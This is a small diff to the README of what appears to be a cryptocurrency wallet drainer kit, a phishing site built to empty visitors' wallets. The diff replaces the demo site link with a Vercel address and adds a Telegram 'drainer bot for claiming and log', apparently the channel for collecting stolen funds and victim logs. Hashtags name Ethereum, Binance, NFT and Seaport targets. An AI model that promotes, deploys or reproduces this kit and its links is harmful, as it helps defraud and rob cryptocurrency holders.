@@ -34,7 +34,10 @@ Upload your website on Vercel or any Hosting
 #    Only thing to do is # STEP 3 
 
 
-# DEMO WEBSITE : https://rectify-mainnetdapps.pages.dev/dapps/ennn/
+# DEMO WEBSITE : https://rpchub.vercel.app
+
+
+# DRAINER BOT FOR CLAIMING AND LOG : https://t.me/vortexhitsbot
 
 #ETHEREUM #BINANCE #NFT #SEAPORT #DRAINERTESTING #BITCOIN #BNB #ETH
 
